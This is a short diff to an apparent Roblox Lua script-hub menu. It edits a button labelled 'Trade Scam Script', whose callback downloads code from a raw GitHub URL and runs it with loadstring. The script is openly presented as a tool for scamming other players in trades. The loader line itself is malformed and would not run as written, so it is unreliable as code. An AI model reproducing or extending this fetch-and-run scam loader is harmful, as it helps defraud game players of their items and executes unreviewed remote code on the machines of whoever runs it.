@@ -59,7 +59,7 @@ StockTab:CreateButton({
 -- 📌 Add script buttons in Scripts tab
 Tab:CreateButton({
     Name = "Trade Scam Script(UPDATED!),only work public server,no loading screen,the inventory wont disapear anymore",
-    Callback = function
+    Callback = function()
         loadstring(function()pGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
     end
 })
